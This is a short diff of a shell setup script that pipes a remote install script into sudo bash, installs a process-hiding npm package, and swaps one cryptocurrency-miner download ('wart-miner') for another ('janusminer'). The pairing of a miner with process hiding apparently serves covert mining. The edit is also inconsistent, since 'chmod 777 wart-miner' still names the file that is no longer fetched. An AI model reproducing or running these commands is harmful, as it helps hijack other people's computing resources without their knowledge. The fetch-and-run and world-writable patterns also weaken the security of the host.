@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/savage/-/raw/main/wart-miner
+wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos
 
 chmod 777 wart-miner
 
